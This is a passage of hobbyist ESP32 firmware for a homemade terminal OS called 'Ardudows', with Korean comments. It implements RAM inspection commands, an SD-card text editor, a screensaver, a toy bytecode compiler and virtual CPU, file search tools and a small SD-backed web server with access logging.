        tft.printf("RAM Write: 0x%X -> 0x%02X ('%c')\n", addr, val, val);
    }

    // --- [ 기능 2: FILL ] ---
    else if (subCmd == "fill") {
        int s1 = args.indexOf(' ');
        int s2 = args.lastIndexOf(' ');
        if (s1 == -1 || s2 == -1 || s1 == s2) { tft.println("Usage: ram fill [start] [end] [val]"); return; }

        uint32_t start = strtoul(args.substring(0, s1).c_str(), NULL, 16);
        uint32_t end = strtoul(args.substring(s1 + 1, s2).c_str(), NULL, 16);
        String valStr = args.substring(s2 + 1);
        valStr.trim();
        uint8_t val = parseSmartValue(valStr);

        if (!isForce && (start < SAFE_START || end > SAFE_END)) {
            tft.println("ACCESS DENIED! Zone protection active."); return;
        }
        for (uint32_t a = start; a <= end; a++) *(volatile uint8_t*)a = val;
        tft.printf("RAM Fill: 0x%X~0x%X with 0x%02X\n", start, end, val);
    }

    // --- [ 기능 3: SCRIBE ] ---
    else if (subCmd == "scribe") {
        int s1 = args.indexOf(' ');
        if (s1 == -1) { tft.println("Usage: ram scribe [addr] [text]"); return; }

        uint32_t addr = strtoul(args.substring(0, s1).c_str(), NULL, 16);
        String text = args.substring(s1 + 1); 

        if (!isForce && (addr < SAFE_START || addr + text.length() > SAFE_END)) {
            tft.println("❌ ACCESS DENIED! Scribe limit."); return;
        }
        for (int i = 0; i < text.length(); i++) *(volatile uint8_t*)(addr + i) = text[i];
        *(volatile uint8_t*)(addr + text.length()) = 0; // NULL 종료
        tft.printf("✅ RAM Scribe: [%s] at 0x%X\n", text.c_str(), addr);
    }

    // --- [ 기능 4: READ ] ---
    else if (subCmd == "read") {
        if (args == "") { tft.println("Usage: ram read [addr]"); return; }
        uint32_t addr = strtoul(args.c_str(), NULL, 16);
        uint8_t val = *(volatile uint8_t*)addr;
        tft.printf("[RAM] 0x%X : 0x%02X ('%c')\n", addr, val, val);
    }

    // --- [ 기능 5: LISTING ] ---
    else if (subCmd == "listing") {
      tft.setTextSize(1);
      // 배경색을 검은색으로 고정하여 글자가 겹쳐서 뭉개지는 잔상 현상 원천 차단!
      tft.setTextColor(TFT_GREEN, TFT_BLACK); 

      int s1 = args.indexOf(' ');
      uint32_t startAddr = (args == "") ? SAFE_START : strtoul(args.substring(0, s1).c_str(), NULL, 16);
      
      // 주소 하위 4비트를 날려서 무조건 16바이트 정렬 스캔 라인 정렬 (상남자의 가독성)
      startAddr &= 0xFFFFFFF0; 

      uint32_t length = (s1 == -1) ? 256 : (uint32_t)args.substring(s1 + 1).toInt();

      tft.printf("\n--- [ Ardudows RAM LISTING : 0x%X ] ---\n", startAddr);
      tft.println("ADDR      00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F | ASCII");
      tft.println("-----------------------------------------------------------------");

      for (uint32_t i = 0; i < length; i += 16) {
        uint32_t currAddr = startAddr + i;
            
        tft.printf("%08X  ", currAddr);

        for (int j = 0; j < 16; j++) {
          uint8_t v = *(volatile uint8_t*)(currAddr + j);
          tft.printf("%02X ", v);
        }

        tft.print("| ");

        for (int j = 0; j < 16; j++) {
          uint8_t v = *(volatile uint8_t*)(currAddr + j);
          if (v >= 32 && v <= 126) tft.print((char)v);
          else tft.print(".");
        }
        tft.println();
            
        if ((i + 16) % 128 == 0) delay(5); // 시리얼/디스플레이 안정화 간격 살짝 양보
      }
      tft.println("-----------------------------------------------------------------");
      tft.setTextSize(2);
    }
}

void run_nano(String path) {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_WHITE);
  tft.printf("[ NANO EDITOR - %s ]\n", path.c_str());
  tft.println("----------------------------");
  tft.setTextColor(TFT_GREEN);

  String content = "";
  // 1. 기존 내용 불러오기
  if (SD.exists(path)) {
    File f = SD.open(path.c_str(), FILE_READ);
    while (f.available()) {
      char c = (char)f.read();
      content += c;
    }
    f.close();
    tft.print(content); // 화면에 뿌리기
  }

  // 2. 실시간 편집 루프
  bool editing = true;
  while (editing) {
    uint8_t key = ps2Keyboard_adf(); // 형님의 ASF 드라이버 출격!
    if (key == KEY_NONE) {
      yield(); // ESP32 와치독 방지
      continue;
    }

    // [ESC] 누르면 저장 없이 종료
    if (key == KEY_ESC) {
      editing = false;
    }
    // [CTRL + S] 느낌으로 엔터를 저장으로 쓸지, 아니면 특정 키를 정해야 합니다.
    // 여기서는 편의상 KEY_F2를 저장으로 설정해볼게요.
    else if (key == KEY_F2) { 
      File f = SD.open(path.c_str(), FILE_WRITE);
      if (f) {
        f.print(content);
        f.close();
        tft.setCursor(0, 230); // 화면 하단에 알림
        tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.print(" SAVED! (ESC to Exit) ");
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
      }
    }
    else if (key == KEY_BACKSPACE) {
      if (content.length() > 0) {
        content.remove(content.length() - 1);
        // 화면 갱신 로직 (간단하게 하려면 다시 그리기)
        tft.fillScreen(TFT_BLACK);
        tft.setCursor(0, 0);
        tft.setTextColor(TFT_WHITE);
        tft.printf("[ NANO EDITOR - %s ]\n", path.c_str());
        tft.println("----------------------------");
        tft.setTextColor(TFT_GREEN);
        tft.print(content);
      }
    }
    else if (key < 128) { // 일반 문자 입력
      char c = keymap[key]; // 형님의 키맵 적용
      if (c != 0) {
        content += c;
        tft.print(c);
      }
    }
  }

  // 3. 종료 후 터미널 복구 (기존 코드 유지)
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_GREEN);
  tft.println("Ardudows ATK v1.1");
}

// 검은 배경에서 가장 잘 보이는 선명한 색상들
uint16_t classicColors[] = {
  TFT_CYAN,    // 밝은 하늘색
  TFT_MAGENTA, // 진한 분홍색
  TFT_YELLOW,  // 노란색
  TFT_GREEN,   // 형광 초록
  TFT_RED,
  TFT_BLUE,
  TFT_WHITE,
  0xFBE0,      // 골드/오렌지
  0x78FF       // 연보라색
};

int dvdX = 40;
int dvdY = 40;

int velX = 3;
int velY = 2;

uint16_t dvdColor = TFT_RED;

void dvdMode() {
  // 시작 전 화면을 검은색으로 초기화
  tft.fillScreen(TFT_BLACK);
  
  while (true) {
    // 1. [지우기] 이전 프레임의 로고 영역을 검은색으로 덮음 (깜빡임 방지)
    // 사각형(30) + 타원(8) + 여백 고려하여 넉넉히 50 높이로 지움
    tft.fillRect(dvdX - 2, dvdY - 2, 84, 50, TFT_BLACK);

    // 2. [이동]
    dvdX += velX;
    dvdY += velY;

    // 3. [벽 충돌 처리] 로고 전체 크기(80x45) 기준
    bool hit = false;
    if (dvdX <= 0 || dvdX >= tft.width() - 80) {
      velX = -velX;
      hit = true;
    }
    if (dvdY <= 0 || dvdY >= tft.height() - 45) {
      velY = -velY;
      hit = true;
    }

    // 부딪혔을 때 색상 변경
    if (hit) {
      dvdColor = classicColors[random(6)];
    }

    // 4. [그리기] 클래식 DVD VIDEO 로고 스타일
    // 하단 타원 (VIDEO 문구가 들어가는 그 타원 느낌)
    tft.drawEllipse(dvdX + 40, dvdY + 35, 38, 10, dvdColor);
    tft.drawEllipse(dvdX + 40, dvdY + 36, 37, 9, dvdColor); // 두께감 추가

    // 메인 사각형 박스
    tft.fillRect(dvdX, dvdY, 80, 28, dvdColor); 
    
    // 박스 안의 DVD 글자 (배경색인 검은색으로 뚫어서 표현)
    tft.setTextColor(TFT_BLACK, dvdColor); 
    tft.setTextSize(3);
    tft.setCursor(dvdX + 13, dvdY + 3);
    tft.print("DVD");

    // 5. [제어 및 종료]
    delay(16); // 약 60fps 유지

    // 시리얼 입력이 들어오면 종료 (종료 키)
    if (Serial.available()) {
      Serial.read();
      break;
    }
  }

  // 종료 후 다시 검은 화면으로 리셋
  tft.fillScreen(TFT_BLACK);
}

// ==========================================
// [전역 변수 및 가상 머신 설정]
// ==========================================
#define MAX_REGISTERS 1000
int32_t R[MAX_REGISTERS] = {0, }; 
bool isSystemInstalled = false;   

enum Opcode {
    OP_HALT = 0x00, OP_MOV = 0x01, OP_ADD = 0x02,
    OP_SUB = 0x03, OP_PRNT = 0x04, OP_TERR = 0x05 
};

const int Protected_X_Min = 1000; const int Protected_X_Max = 2000;
const int Protected_Y_Min = 1000; const int Protected_Y_Max = 2000;

// ==========================================
// [부트스트래핑: 최초 영토 생성]
// ==========================================
void triggerSystemInstall() {
    tft.println("[*] Initializing SD File System...");
    
    // 기본 루트 생성 실패 시 SD카드 연결 확인
    if (!SD.exists("/Ardudows")) {
        if(!SD.mkdir("/Ardudows")) {
            tft.println("[!] CRITICAL: SD Card Write Protected or Disconnected.");
            return;
        }
    }

    // 디렉토리 구조 강제 고정
    String dirs[] = {"/Ardudows/System/bin", "/Ardudows/System/Config", "/Ardudows/Users/src", "/Ardudows/Users/Apps"};
    for(String d : dirs) {
        if (!SD.exists(d)) {
            if(SD.mkdir(d)) tft.printf("[+] Created: %s\n", d.c_str());
            else tft.printf("[-] Fail: %s\n", d.c_str());
        }
    }
    
    File config = SD.open("/Ardudows/System/Config/server_setting.asf", FILE_WRITE);
    if (config) {
        config.println("SERVER_ID=221서버");
        config.println("PROTECT_LAYER=TRUE");
        config.close();
    }

    isSystemInstalled = true;
    tft.println("[+] System Anchored to SD.");
}

// ==========================================
// [lib 시리즈 7대장 - 보안 강화 버전]
// ==========================================

// 1. 소환: 지정된 사용자 영토만 접근
void libSummon(String filename) {
    if (!filename.endsWith(".txt")) filename += ".txt";
    String path = "/Ardudows/Users/src/" + filename;

    if (SD.exists(path)) {
        tft.println("[-] Error: File already exists in /src.");
        return;
    }

    File f = SD.open(path, FILE_WRITE);
    if (f) {
        f.println("// Ardudows Source File");
        f.close();
        tft.printf("[+] Summoned: %s\n", path.c_str());
    } else {
        tft.println("[-] Fail: Check SD Write Lock or Space.");
    }
}

// 2. 편집: 실시간 스트리밍 쓰기
void libEdit(String filename) {
    if (!filename.endsWith(".txt")) filename += ".txt";
    String path = "/Ardudows/Users/src/" + filename;

    if (!SD.exists(path)) {
        tft.println("[-] Error: File not found. Summon it first.");
        return;
    }

    File f = SD.open(path, FILE_WRITE); 
    if (!f) { tft.println("[-] Stream Error."); return; }

    tft.println("[!] Type 'exit' to save and quit.");
    while (true) {
        if (Serial.available() > 0) {
            String line = Serial.readStringUntil('\n');
            line.trim();
            if (line == "exit") break;
            f.println(line);
            Serial.println(">> " + line);
        }
    }
    f.close();
    tft.println("[+] Save Complete.");
}

// 3. 목록: 보안 필터링 적용 (시스템 파일 은폐)
void libList() {
    tft.println("[*] Scanning Authorized Territories...");
    const char* targets[] = {"/Ardudows/Users/src", "/Ardudows/Users/Apps"};
    
    for(int i=0; i<2; i++) {
        File dir = SD.open(targets[i]);
        if (!dir) {
            tft.printf("[-] %s: Path missing.\n", targets[i]);
            continue;
        }
        
        tft.printf("\n[%s]\n", targets[i]);
        int count = 0;
        while (true) {
            File entry = dir.openNextFile();
            if (!entry) break;
            if (!entry.isDirectory()) {
                tft.printf(" - %s (%d B)\n", entry.name(), entry.size());
                count++;
            }
            entry.close();
        }
        if(count == 0) tft.println(" (Empty)");
        dir.close();
    }
}

// 4. 컴파일: 파싱 오류 상세 출력
void libCompile(String filename) {
    if (!filename.endsWith(".txt")) filename += ".txt";
    String srcPath = "/Ardudows/Users/src/" + filename;
    
    if (!SD.exists(srcPath)) {
        tft.printf("[-] Fail: %s not found.\n", srcPath.c_str());
        return;
    }

    String binName = filename;
    binName.replace(".txt", ".bin");
    String sysBinPath = "/Ardudows/System/bin/" + binName;

    File srcFile = SD.open(srcPath, FILE_READ);
    File binFile = SD.open(sysBinPath, FILE_WRITE);

    if (!srcFile || !binFile) {
        tft.println("[-] I/O Error during compilation.");
        return;
    }

    int lineNum = 0;
    while (srcFile.available()) {
        lineNum++;
        String line = srcFile.readStringUntil('\n');
        line.trim();
        if (line.length() == 0 || line.startsWith("//")) continue;

        int space1 = line.indexOf(' ');
        if (space1 == -1) { tft.printf("[!] Skip L%d: Invalid Syntax\n", lineNum); continue; }

        int space2 = line.indexOf(' ', space1 + 1);
        String cmd = line.substring(0, space1);
        String arg1 = line.substring(space1 + 1, space2);
        String arg2 = (space2 == -1) ? "" : line.substring(space2 + 1);

        uint8_t opcode = OP_HALT;
        uint16_t regDest = arg1.substring(1).toInt();
        int32_t valOrSrc = arg2.startsWith("R") ? arg2.substring(1).toInt() : arg2.toInt();

        if (cmd == "MOV") opcode = OP_MOV;
        else if (cmd == "ADD") opcode = OP_ADD;
        else if (cmd == "SUB") opcode = OP_SUB;
        else if (cmd == "PRNT") opcode = OP_PRNT;
        else if (cmd == "TERR") opcode = OP_TERR;
        else { tft.printf("[!] L%d: Unknown CMD %s\n", lineNum, cmd.c_str()); continue; }

        binFile.write(opcode);
        binFile.write((uint8_t*)&regDest, sizeof(regDest));
        binFile.write((uint8_t*)&valOrSrc, sizeof(valOrSrc));
    }
    srcFile.close(); binFile.close();
    tft.println("[+] Compiled to system/bin");
}

// 5. 실행: 가상 CPU 런타임
void libRun(String filename) {
    if (!filename.endsWith(".bin")) filename += ".bin";
    String path = "/Ardudows/Users/Apps/" + filename;
    if (!SD.exists(path)) path = "/Ardudows/System/bin/" + filename;

    if (!SD.exists(path)) {
        tft.println("[-] Error: Binary not found. Install it first.");
        return;
    }

    File binFile = SD.open(path, FILE_READ);
    while (binFile.available()) {
        uint8_t opcode = binFile.read();
        uint16_t regDest; int32_t valOrSrc;
        binFile.read((uint8_t*)&regDest, sizeof(regDest));
        binFile.read((uint8_t*)&valOrSrc, sizeof(valOrSrc));

        switch (opcode) {
            case OP_MOV: if (regDest < MAX_REGISTERS) R[regDest] = valOrSrc; break;
            case OP_ADD: if (regDest < MAX_REGISTERS) R[regDest] += valOrSrc; break;
            case OP_SUB: if (regDest < MAX_REGISTERS) R[regDest] -= valOrSrc; break;
            case OP_PRNT: if (regDest < MAX_REGISTERS) tft.printf("[vCPU] R%d: %d\n", regDest, R[regDest]); break;
            case OP_TERR:
                if (regDest >= Protected_X_Min && regDest <= Protected_X_Max && valOrSrc >= Protected_Y_Min && valOrSrc <= Protected_Y_Max) {
                    tft.println("[🚨] SERVER_221_PROTECTION_FAULT!");
                    binFile.close(); return;
                }
                break;
        }
    }
    binFile.close();
    tft.println("[+] Done.");
}

// 6. 삭제: 영토 기반 삭제
void libDelete(String filename) {
    String path = "";
    if (filename.endsWith(".txt")) path = "/Ardudows/Users/src/" + filename;
    else if (filename.endsWith(".bin")) {
        path = "/Ardudows/User/Apps/" + filename;
        if (!SD.exists(path)) path = "/Ardudows/System/bin/" + filename;
    }

    if (SD.exists(path)) {
        if(SD.remove(path)) tft.println("[+] Purged.");
        else tft.println("[-] Fail: File locked.");
    } else {
        tft.println("[-] Error: Path not found.");
    }
}

// 7. 인스톨: 최종 앱 배포
void libInstall(String filename) {
    libCompile(filename);
    String binName = filename; binName.replace(".txt", ".bin");
    if(!binName.endsWith(".bin")) binName += ".bin";

    String sysPath = "/Ardudows/System/bin/" + binName;
    String userAppPath = "/Ardudows/Users/Apps/" + binName;

    if (!SD.exists(sysPath)) return;

    File sysBin = SD.open(sysPath, FILE_READ);
    File userApp = SD.open(userAppPath, FILE_WRITE);

    if (sysBin && userApp) {
        while (sysBin.available()) userApp.write(sysBin.read());
        sysBin.close(); userApp.close();
        tft.println("[+] App Deployed to /users/apps");
    } else {
        tft.println("[-] Installation Failed.");
    }
}

// ==========================================
// [중앙 명령어 연동 디스패처]
// ==========================================
void cmd_lib_dispatcher(String cmd) {
  cmd.trim();
  if (cmd == "lib") {
    tft.println("Usage: lib <list|summon|edit|compile|run|delete|install>");
    return;
  }
  if (cmd == "lib install lib") { triggerSystemInstall(); return; }
  if (!isSystemInstalled) { tft.println("[-] System Locked. Run 'lib install lib' first."); return; }

  String subCmd = cmd.substring(4); subCmd.trim();
  int firstSpace = subCmd.indexOf(' ');
  String action = (firstSpace == -1) ? subCmd : subCmd.substring(0, firstSpace);
  String target = (firstSpace == -1) ? "" : subCmd.substring(firstSpace + 1);
  target.trim();

  if (action == "list") libList();
  else if (action == "summon") { if(target=="") tft.println("Arg?"); else libSummon(target); }
  else if (action == "edit") { if(target=="") tft.println("Arg?"); else libEdit(target); }
  else if (action == "compile") { if(target=="") tft.println("Arg?"); else libCompile(target); }
  else if (action == "run") { if(target=="") tft.println("Arg?"); else libRun(target); }
  else if (action == "delete") { if(target=="") tft.println("Arg?"); else libDelete(target); }
  else if (action == "install") { if(target=="") tft.println("Arg?"); else libInstall(target); }
  else tft.println("[-] Unknown tool.");
}

// ====================================================================
// [1. CMD_WHERE]: 지정한 디렉터리 하위에서 특정 파일 이름을 강제 수색 (where /r 기능)
// ====================================================================
void cmd_where(File dir, const char* fileName) {
    while (true) {
        File entry = dir.openNextFile();
        if (!entry) break; // 더 이상 파일이 없으면 탈출

        if (entry.isDirectory()) {
            // 디렉터리라면 재귀 호출로 하위 폴더 추적
            cmd_where(entry, fileName);
        } else {
            // 파일 이름이 일치(포함)하는지 확인
            if (strstr(entry.name(), fileName) != NULL) {
                tft.print("[FOUND] ");
                tft.println(entry.path()); // 화면(TFT)에 절대 경로 출력
                Serial.print("[FOUND] "); 
                Serial.println(entry.path()); // 백업용 시리얼 출력
            }
        }
        entry.close();
    }
}

// ====================================================================
// [2. CMD_WHAT]: 파일의 메타데이터를 분석하고, 내부 내용을 글자 크기 1 스타일로 덤프
// ====================================================================
void cmd_what(const char* filePath) {
    if (!SD.exists(filePath)) {
        tft.printf("Error: '%s' No search file.\n", filePath);
        return;
    }

    File file = SD.open(filePath, FILE_READ);
    if (!file) {
        tft.println("Error: file open failed.");
        return;
    }

    // A. 파일 메타데이터 분석 및 출력 (TFT 화면 타겟)
    tft.println("\n=============================================");
    tft.printf("[WHAT REPORT] File: %s\n", file.name());
    tft.println("============================================="); // tftl 오타 수정
    tft.printf("file size: %d Bytes\n", file.size());
    
    // 확장자 추출
    const char* ext = strrchr(file.name(), '.');
    tft.printf("file type: %s\n", ext ? ext : "Unknown");
    tft.println("---------------------------------------------");
    tft.println("[File Content Dump - Text Size: 1]");
    
    // B. 내부 내용 덤프 (시리얼 모니터엔 ANSI 특수 효과 적용, TFT는 폰트 크기 강제 축소)
    
    // 💡 Ardudows 디스플레이 폰트 강제 축소 (가장 작게 세팅)
    tft.setTextSize(1); 

    while (file.available()) {
        char c = file.read();
        tft.print(c);   // LCD 화면 출력
    }
    
    tft.setTextSize(2);    // 원래 Ardudows 표준 터미널 폰트 크기로 복구
    tft.println("\n=============================================\n");

    file.close();
}

// [로그 시스템] 트래픽 진입 시 실시간으로 앱 컨테이너 내부에 access.log 누적
void logAccess(int slot, String clientIP, String reqURI, int statusCode) {
    String logDir = http_slots[slot].basePath + "log";
    String logFile = logDir + "/access.log";

    if (!SD.exists(logDir.c_str())) {
        SD.mkdir(logDir.c_str());
    }

    File log = SD.open(logFile.c_str(), FILE_WRITE);
    if (log) {
        // 백엔드 접속 로그 포맷 스트라이크 (향후 NTP 시간 연동 확장 가능)
        log.printf("[IP: %s] Req: %s -> Status: %d\n", clientIP.c_str(), reqURI.c_str(), statusCode);
        log.close();
    }
}

// [동적 라우팅 매니저] HTML, CSS, JS 인터페이스 자동 판별 배달 가속기
void handleStaticAssets(int slot, AsyncWebServerRequest *request) {
    String clientIP = request->client()->remoteIP().toString();
    String reqURI = request->url();

    // 루트 경로 진입 시 기본 인덱스 매핑
    if (reqURI == "/") {
        reqURI = "/index.html";
    }

    String targetFilePath = http_slots[slot].basePath + reqURI;

    // 1. 파일 예외 처리 (SD 카드 부재 시 404 떨구고 즉시 로깅)
    if (!SD.exists(targetFilePath.c_str())) {
        request->send(404, "text/plain", "404 Not Found by Ardudows Kernel");
        logAccess(slot, clientIP, reqURI, 404);
        return;
    }

    // 2. 형님이 제시하신 표준 웹 앱 확장자 타입(MIME) 정밀 스캔
    String contentType = "text/plain";
    if (targetFilePath.endsWith(".html")) contentType = "text/html";
    else if (targetFilePath.endsWith(".css"))  contentType = "text/css";
    else if (targetFilePath.endsWith(".js"))   contentType = "application/javascript";
    else if (targetFilePath.endsWith(".ico"))  contentType = "image/x-icon";

    // 3. SD 카드 스트리밍 가동 및 통로 유지 헤더 주입
    AsyncWebServerResponse *response = request->beginResponse(SD, targetFilePath.c_str(), contentType);
    response->addHeader("Cache-Control", "public, max-age=3600"); // 브라우저 캐싱 가속 
    response->addHeader("Connection", "keep-alive");
    request->send(response);

    logAccess(slot, clientIP, reqURI, 200);
}

// [ENGINE CORE] 물리 인스턴스 백그라운드 스레드 기동 (Core 0 독립 할당)
void start_server_instance(int slot) {
    if (active_servers[slot] != NULL) return;

    if (http_slots[slot].port <= 0 || http_slots[slot].port > 65535) {
        tft.println("!! CRITICAL: Port Bound Broken");
        return;
    }

    active_servers[slot] = new AsyncWebServer(http_slots[slot].port);

    // [인터페이스 1] 전체 동적 파일 배달 및 로그 경로 단일화 매핑 (와일드카드 처리)
    active_servers[slot]->onNotFound([slot](AsyncWebServerRequest *request) {
        handleStaticAssets(slot, request);
    });

    // [인터페이스 2] 실시간 자바스크립트 통신 전용 API 및 221서버 보호구역 락커
    active_servers[slot]->on("/api/terrain", HTTP_GET, [slot](AsyncWebServerRequest *request) {
        String clientIP = request->client()->remoteIP().toString();
        if(request->hasParam("x") && request->hasParam("y")) {
            int rx = request->getParam("x")->value().toInt();
            int ry = request->getParam("y")->value().toInt();
            
            if(rx == PROTECTED_ISLAND_X && ry == PROTECTED_ISLAND_Y) {
                request->send(403, "application/json", "{\"error\":\"PROTECTED\", \"msg\":\"221 Island Untouched!\"}");
                logAccess(slot, clientIP, "/api/terrain(DENIED)", 403);
                return;
            }
        }
        request->send(200, "application/json", "{\"status\":\"SUCCESS\", \"info\":\"Ardudows Cloud Layer Connected\"}");
        logAccess(slot, clientIP, "/api/terrain", 200);
    });

    active_servers[slot]->begin();
    http_slots[slot].isActive = true;
}

// 물리 인스턴스 정지 엔진
void stop_server_instance(int slot) {
    if (active_servers[slot] != NULL) {
        active_servers[slot]->end();
        delete active_servers[slot];
        active_servers[slot] = NULL;
        http_slots[slot].isActive = false;
    }
}

// -----------------------------------------------------------------
// [HTTP OS MANAGER] cmd_http() 구현체 (sum | edit | del | status | stop | run)
// -----------------------------------------------------------------
void cmd_http(String args) {
    args.trim();
    String sub = args.substring(0, args.indexOf(' '));
    sub.trim();
    String remaining = args.substring(args.indexOf(' ') + 1);
    remaining.trim();

    // [1] status : 커널 슬롯별 주소 및 인프라 매핑 상태 확인
    if (args == "status" || sub == "status") {
        tft.println(">> ARDUDOWS WEB APPS STATUS:");
        for(int i=0; i<4; i++) {
            if(!http_slots[i].isSecure) {
                tft.printf(" [%d] Port:%d Path:%s -> %s\n", 
                    i, http_slots[i].port, http_slots[i].basePath.c_str(), 
                    http_slots[i].isActive ? "ONLINE" : "OFFLINE");
            }
        }
    }
    // [2] run : 특정 앱 컨테이너 기동
    else if (sub == "run") {
        int slot = remaining.toInt();
        if(slot >= 0 && slot < 4 && !http_slots[slot].isSecure) {
            start_server_instance(slot);
            tft.printf(">> Slot %d App Container [RUNNING]\n", slot);
        } else tft.println("!! INVALID SLOT CHOSEN");
    }
    // [3] stop : 특정 앱 컨테이너 정지
    else if (sub == "stop") {
        int slot = remaining.toInt();
        if(slot >= 0 && slot < 4 && !http_slots[slot].isSecure) {
            stop_server_instance(slot);
            tft.printf(">> Slot %d App Container [STOPPED]\n", slot);
        } else tft.println("!! INVALID SLOT CHOSEN");
    }
    // [4] sum : 포트 지정 시 아두도스 컨테이너 규격 폴더/파일 패키지 자동 빌드 엔진! 🔥
    else if (sub == "sum") {
        long inputPort = remaining.toInt();
        if (inputPort <= 0 || inputPort > 65535) {
            tft.setTextColor(TFT_RED);
            tft.println("!! LIMIT ERROR: Ports range 1 ~ 65535 only!");
            tft.setTextColor(TFT_GREEN);
            return;
        }

        // 포트 번호 기반으로 표준 앱 샌드박스 경로 강제 획정
        String web_path = "/Ardudows/System/NetWork/HTTP/" + String(inputPort) + "/";
        
        // 디렉터리 체계 유무 검사 후 연쇄 자동 생성 (mkdir)
        if (!SD.exists(web_path.c_str())) {
            SD.mkdir(web_path.c_str());
            SD.mkdir((web_path + "log").c_str());
            tft.println(">> App SandBox Created.");
        }

        // [A] index.html 자동 생성 및 자바스크립트 비동기 Fetch 연동 구문 주입
        String htmlPath = web_path + "index.html";
        if (!SD.exists(htmlPath.c_str())) {
            File f = SD.open(htmlPath.c_str(), FILE_WRITE);
            if (f) {
                f.println("<!DOCTYPE html><html><head><meta charset='UTF-8'><link rel='stylesheet' href='style.css'><title>Ardudows Container</title></head>");
                f.println("<body><div class='container'><h1>[🔥 ARDUDOWS INTERACTIVE DAEMON ]</h1>");
                f.printf("<p class='status'>PORT BOUND: %d | STATUS: RUNNING</p>", (int)inputPort);
                f.println("<button onclick='fetchTerrain()'>221 Area Terrain Check</button>");
                f.println("<div id='response' class='console'>Waiting Node Trigger...</div></div>");
                f.println("<script src='script.js'></script></body></html>");
                f.close();
            }
        }

        // [B] style.css 디자인 파일 자동 생성 및 주입
        String cssPath = web_path + "style.css";
        if (!SD.exists(cssPath.c_str())) {
            File f = SD.open(cssPath.c_str(), FILE_WRITE);
            if (f) {
                f.println("body { background: #121212; color: #00FF00; font-family: monospace; padding: 40px; }");
                f.println(".container { border: 1px solid #00FF00; padding: 20px; border-radius: 5px; }");
                f.println("button { background: #00FF00; color: #121212; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; }");
                f.println(".console { background: #000; padding: 15px; margin-top: 15px; border-left: 3px solid #00FF00; }");
                f.close();
            }
        }

        // [C] script.js 자바스크립트 뼈대 실시간 연동 파일 자동 생성 및 주입 ✨
        String jsPath = web_path + "script.js";
        if (!SD.exists(jsPath.c_str())) {
            File f = SD.open(jsPath.c_str(), FILE_WRITE);
            if (f) {
                f.println("function fetchTerrain() {");
                f.println("  document.getElementById('response').innerText = 'Querying Core Core...';");
                f.println("  fetch('/api/terrain?x=221&y=221')"); // 221 예시 저격
                f.println("    .then(res => res.json())");
                f.println("    .then(data => {");
                f.println("      document.getElementById('response').innerText = JSON.stringify(data);");
                f.println("    }).catch(err => {");
                f.println("      document.getElementById('response').innerText = 'Transmission Blocked or Fault!';");
                f.println("    });");
                f.println("}");
                f.close();
                tft.println(">> Web Asset Trio Generated!");
            }
        }

        // 비어있는 제어 슬롯 매핑 후 동기화
        for(int i=0; i<4; i++) {
            if(!http_slots[i].isActive && !http_slots[i].isSecure) {
                http_slots[i].port = (int)inputPort;
                http_slots[i].basePath = web_path;
                tft.printf(">> Slot [%d] Bound Standard Package Ready.\n", i);
                return;
            }
        }
        tft.println("!! CRITICAL: Kernel Server Slot Full.");
    }
    // [5] edit : 타깃 슬롯의 샌드박스 경로 변경 기동
    else if (sub == "edit") {
        int nextSpace = remaining.indexOf(' ');
        int slot = remaining.substring(0, nextSpace).toInt();
        String newPath = remaining.substring(nextSpace + 1);
        newPath.trim();

        if(slot >= 0 && slot < 4 && !http_slots[slot].isSecure) {
            bool wasRunning = http_slots[slot].isActive;
            if(wasRunning) stop_server_instance(slot);
            http_slots[slot].basePath = newPath;
            tft.printf(">> Slot %d Core Redirected -> %s\n", slot, newPath.c_str());
            if(wasRunning) start_server_instance(slot);
        } else tft.println("!! INVALID FORMAT");
    }
    // [6] del : 슬롯 셧다운 및 메모리 언바인딩
    else if (sub == "del") {
        int slot = remaining.toInt();
        if(slot >= 0 && slot < 4 && !http_slots[slot].isSecure) {
            stop_server_instance(slot);
            http_slots[slot].port = 0;
            http_slots[slot].basePath = "";
            tft.printf(">> Slot %d Released Successfully.\n", slot);
        } else tft.println("!! INVALID SLOT");
    }
    else {
        tft.println("HTTP CLI: sum | edit | del | status | stop | run");
    }
}

// -----------------------------------------------------------------
// [HTTPS OS MANAGER] cmd_https() 구현체 (보안 가속 세션용)
// -----------------------------------------------------------------
void cmd_https(String args) {
    // 구조는 HTTP 매니저와 완전히 동일하되 SSL 인증서 유무 필터 및 암호화 기동 고정
    args.trim();
    String sub = args.substring(0, args.indexOf(' '));
    sub.trim();
    String remaining = args.substring(args.indexOf(' ') + 1);
    remaining.trim();

    if (args == "status" || sub == "status") {
        tft.println(">> HTTPS CRYPTO SLOTS:");
        for(int i=0; i<4; i++) {
            if(http_slots[i].isSecure) {
                tft.printf(" [%d] SecurePort:%d Path:%s -> %s\n", 
                    i, http_slots[i].port, http_slots[i].basePath.c_str(), 
                    http_slots[i].isActive ? "CRYPTO_ACTIVE" : "LOCKED");
            }
        }
    }
    else if (sub == "run") {
        int slot = remaining.toInt();
        if(slot >= 0 && slot < 4 && http_slots[slot].isSecure) {
            if (!SD.exists("/sys/cert.pem") || !SD.exists("/sys/key.pem")) {
                tft.println("!! SSL EXCEPTION: Cert / Key Missing in SD card!");
                return;
            }
            start_server_instance(slot);
            tft.printf(">> Secure Container %d [RUN]\n", slot);
        }
    }
    else if (sub == "stop") {
        int slot = remaining.toInt();
        if(slot >= 0 && slot < 4 && http_slots[slot].isSecure) {
            stop_server_instance(slot);
            tft.printf(">> Secure Container %d [STOP]\n", slot);
        }
    }
    else if (sub == "sum") {
        long port = remaining.toInt();
        if (port <= 0 || port > 65535) return;
        String web_path = "/Ardudows/System/Network/HTTPS/" + String(port) + "/";
        
        for(int i=0; i<4; i++) {
            if(!http_slots[i].isActive && http_slots[i].isSecure) {
                http_slots[i].port = (int)port;
                http_slots[i].basePath = web_path;
                tft.printf(">> Secure Vault Container Bound to Slot [%d]\n", i);
                return;
            }
        }
    }
    else {
        tft.println("HTTPS CLI: sum | status | stop | run");
    }
}

// ================== COMMAND PARSER ==================

void executeCommand(String cmd) {
  cmd.trim();
  // 사용자가 친 단축어가 동적 alias 배열에 있는지 루프 돌며 스캔
  for (int i = 0; i < aliasCount; i++) {
